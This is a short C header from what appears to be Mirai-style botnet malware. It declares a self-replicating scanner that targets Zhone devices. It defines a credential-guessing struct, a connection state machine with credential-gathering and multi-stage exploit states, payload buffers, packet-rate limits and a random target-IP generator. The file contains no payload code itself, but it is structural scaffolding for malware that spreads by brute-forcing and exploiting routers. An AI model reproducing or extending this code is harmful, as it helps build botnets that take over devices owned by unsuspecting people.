#ifdef SELFREP

#pragma once

#include <stdint.h>

#include "includes.h"

#define ZHONE_SCANNER_MAX_CONNS   256
#define ZHONE_SCANNER_RAW_PPS     788

#define ZHONE_SCANNER_RDBUF_SIZE  1080
#define ZHONE_SCANNER_HACK_DRAIN  64

struct zhone_scanner_auth {
    char *username;
    char *password;
    uint16_t weight;
};

struct zhone_scanner_connection
{
    int fd, last_recv;
    enum
    {
        ZHONE_SC_CLOSED,
        ZHONE_SC_CONNECTING,
        ZHONE_SC_GET_CREDENTIALS,
        ZHONE_SC_EXPLOIT_STAGE2,
        ZHONE_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[ZHONE_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[5000], payload_buf2[5000];
    int credential_index;
};

void zhone_scanner_init();
void zhone_kill(void);

static void zhone_setup_connection(struct zhone_scanner_connection *);
static ipv4_t get_random_zhone_ip(void);

#endif
